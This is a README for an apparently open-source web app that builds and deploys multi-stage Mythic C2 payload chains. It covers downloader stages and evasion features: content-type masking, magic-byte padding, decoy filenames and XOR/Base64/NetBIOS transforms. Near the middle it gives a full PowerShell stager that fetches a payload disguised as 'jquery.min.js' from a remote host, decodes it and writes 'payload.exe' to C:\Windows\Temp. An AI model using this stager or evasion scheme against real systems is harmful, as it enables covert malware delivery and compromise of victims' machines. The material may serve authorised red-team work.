# Mythic Payload Builder

A web interface for building, managing, and deploying multi-stage payload chains to [Mythic C2](https://github.com/its-a-feature/Mythic).

---

## Features

- **Visual chain builder** — ordered stage cards (collapse/expand for a compact view)
- **Three stage types**:
  - **Base** — a Mythic agent (e.g. `netscan_agent`)
  - **Wrapper** — wraps any upstream stage (base, wrapper, or downloader)
  - **Downloader** — builds the wrapped payload and delivers it via a file server
- **Real-time deploy log** — Server-Sent Events stream showing each build step as it happens
- **Auto-cleanup** — previous payloads tagged with the chain's Mythic tag are deleted before each redeploy
- **File parameters** — files stored locally, uploaded to Mythic only at deploy time (SHA-256 dedup)
- **Chain variables** — define `{{VAR_NAME}}` once, use in any string parameter (resolved at deploy time)
- **Downloader OPSEC parameters** — content-type masking, byte padding, transform pipeline
- **Dual hosting modes** — upload payloads to [payload-server](../payload-server) or use Mythic's native `c2HostFile`
- **payload-server integration** — select `📦 payload-server` as C2 profile in any downloader stage
- **Orphan param detection** — badge `⚠ not in Mythic` + "Sync with Mythic" button for renamed/removed parameters
- **↻ Sync Mythic** — reload payload types from Mythic without reloading the page
- **ZIP export** — portable chain archive including referenced files, variables, and metadata

---

## Requirements

- Docker & Docker Compose
- A running [Mythic C2](https://github.com/its-a-feature/Mythic) instance (v3+)
- *(Optional)* [payload-server](../payload-server) for OPSEC-enhanced file hosting

---

## Quick Start

```bash
git clone <repo-url>
cd mythic-payload-webapp
cp .env.example .env
# Edit .env — set MYTHIC_URL, MYTHIC_USERNAME, MYTHIC_PASSWORD
# Optionally set PAYLOAD_SERVER_URL and PAYLOAD_SERVER_TOKEN
docker compose up -d --build
```

Open [http://localhost:7080](http://localhost:7080).

> **Always use `--build`** when restarting — Docker caches the frontend build layer and will serve a stale UI without it. Or use `make up` which includes `--build` automatically.

---

## Environment Variables (`.env`)

| Variable | Description |
|----------|-------------|
| `MYTHIC_URL` | Mythic server URL, e.g. `https://192.168.1.100:7443` |
| `MYTHIC_USERNAME` | Mythic username |
| `MYTHIC_PASSWORD` | Mythic password |
| `PAYLOAD_SERVER_URL` | payload-server management URL, e.g. `http://192.168.1.100:7082` |
| `PAYLOAD_SERVER_TOKEN` | payload-server management token (`MGMT_TOKEN`) |

All variables can also be set via the **Settings** page in the UI. DB values take priority over `.env`.

---

## Architecture

| Component | Technology |
|-----------|-----------|
| Backend | Python 3.13, FastAPI, SQLAlchemy, SQLite |
| Frontend | React 18, Vite, Tailwind CSS |
| Deployment | Docker Compose |

**Ports:**
- `7080` — Frontend (public)
- `7081` — Backend API (localhost only, proxied through nginx at `/api/`)

---

## Chain Editor

### Stage Types

**Base stage** — deploys a Mythic payload type directly. Must have a C2 profile configured.

**Wrapper stage** — wraps an upstream stage (base, wrapper, or downloader). Set the *Wraps* field to the label of the upstream stage.

**Downloader stage** — a special wrapper that:
1. Builds the wrapped payload via Mythic
2. Downloads it from Mythic internally
3. Uploads it to payload-server (or uses Mythic `c2HostFile` if payload-server is not configured)
4. Injects the download URL into a build parameter (auto-detected as `downloader_url`)

For the **C2 Profile** field of a downloader stage, select `📦 payload-server` if you want the file hosted on payload-server. The `Base URL` and `Profile URL` fields remain the address injected into the payload (what the target machine will contact) — not the payload-server address.

### Chain Variables

Define key/value pairs in the **Variables** section of a chain. Reference them anywhere with `{{VAR_NAME}}`:

```
Variables:
  DOMAIN  = target.example.com
  C2_HOST = https://target.example.com:443

Usage in parameters:
  callback_domains = ["{{C2_HOST}}"]
  base_url         = {{C2_HOST}}
  label            = {{DOMAIN}}_agent.exe
```

Variables are resolved at deploy time — not stored in Mythic. They are also included in ZIP exports.

### Downloader Stage — Special Parameters

These parameters control how the payload is served by payload-server. All support `{{VAR}}` substitution.

| Parameter | Type | Description |
|-----------|------|-------------|
| `downloader_prepend` | int | Bytes prepended before the payload (magic bytes + random fill from content-type preset) |
| `downloader_append` | int | Bytes appended after the payload (random fill + magic bytes from content-type preset) |
| `downloader_contenttype` | str | HTTP `Content-Type` served to the client |
| `downloader_filename` | str | `Content-Disposition` filename (decoy name) |
| `downloader_transform` | str | Comma-separated transform pipeline (see below) |
| `downloader_xor_key` | int | XOR key 0–255 (used when `xor` is in the pipeline) |

> **Note:** When `downloader_prepend` or `downloader_append` is > 0, payload-server automatically uses the Content-Type preset (magic bytes) for the matching MIME type. See [payload-server Content-Type Presets](../payload-server/README.md#content-type-presets).

#### Transform Pipeline

Transforms are applied **left to right** at serve time. The client must apply them in **reverse order**.

| Transform | Encoding |
|-----------|----------|
| `xor` | XOR each byte with `downloader_xor_key` |
| `base64` | Standard Base64 |
| `base64u` | URL-safe Base64, no padding |
| `netbios` | NetBIOS encoding (nibbles → `a`–`p`) |
| `netbiosu` | NetBIOS encoding uppercase (`A`–`P`) |

Example: `downloader_transform = xor,base64` → server XORs then Base64-encodes. Client must Base64-decode then XOR.

#### PowerShell decode example

```powershell
$Url       = "http://192.168.1.x:8443/jquery.min.js"
$XorKey    = 0x41
$Prepend   = 512
$Append    = 256
$Transform = "xor,base64"  # must match downloader_transform

$Raw = (New-Object Net.WebClient).DownloadData($Url)

# Strip padding
if ($Prepend -gt 0) { $Raw = $Raw[$Prepend..($Raw.Length - 1)] }
if ($Append  -gt 0) { $Raw = $Raw[0..($Raw.Length - 1 - $Append)] }

# Apply transforms in reverse
$Steps = ($Transform -split ',') | ForEach-Object { $_.Trim() }
[Array]::Reverse($Steps)
$Data = $Raw

foreach ($Step in $Steps) {
    switch ($Step) {
        "base64"   { $Data = [Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($Data)) }
        "base64u"  {
            $B64 = [Text.Encoding]::ASCII.GetString($Data) -replace '-','+' -replace '_','/'
            $Data = [Convert]::FromBase64String($B64 + '=' * ((4 - $B64.Length % 4) % 4))
        }
        "xor"      { $Data = $Data | ForEach-Object { $_ -bxor $XorKey } }
        "netbios"  {
            $Out = New-Object Collections.Generic.List[byte]
            for ($i = 0; $i -lt $Data.Length; $i += 2) {
                $Out.Add((($Data[$i] - [byte]'a') -shl 4) -bor ($Data[$i+1] - [byte]'a'))
            }
            $Data = $Out.ToArray()
        }
        "netbiosu" {
            $Out = New-Object Collections.Generic.List[byte]
            for ($i = 0; $i -lt $Data.Length; $i += 2) {
                $Out.Add((($Data[$i] - [byte]'A') -shl 4) -bor ($Data[$i+1] - [byte]'A'))
            }
            $Data = $Out.ToArray()
        }
    }
}

# $Data is now the raw payload binary
[IO.File]::WriteAllBytes("C:\Windows\Temp\payload.exe", $Data)
```

### File Parameters

When a build parameter is of type `File`:
1. Select the file in the UI → stored locally in the app database
2. At deploy time → uploaded to Mythic, UUID substituted automatically
3. Same file content (same SHA-256) → reused, not re-uploaded

---

## Hosting Modes

| Mode | When | Behavior |
|------|------|----------|
| **payload-server** | `PAYLOAD_SERVER_URL` + `PAYLOAD_SERVER_TOKEN` set | Downloads payload from Mythic, uploads to payload-server with OPSEC options |
| **Mythic c2HostFile** | No payload-server configured | Uses Mythic's native `c2HostFile` API on the C2 profile |

---

## ZIP Export

Export a chain as `.zip` containing:
- `chain.yaml` — human-readable chain definition with variables
- `files/` — all referenced file parameters
- `manifest.json` — file mapping metadata

---

## Development

```bash
# Backend
cd backend
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
uvicorn app.main:app --reload --port 8000

# Frontend
cd frontend
npm install
npm run dev   # Vite dev server on :5173
```

---

## Mythic Payload Type Detection

| Classification | Rule |
|---------------|------|
| **Base** | `wrapper = false` in Mythic |
| **Wrapper** | `wrapper = true`, no build param named `downloader_url` |
| **Downloader** | `wrapper = true`, has a build param named `downloader_url` |

---

## License

MIT
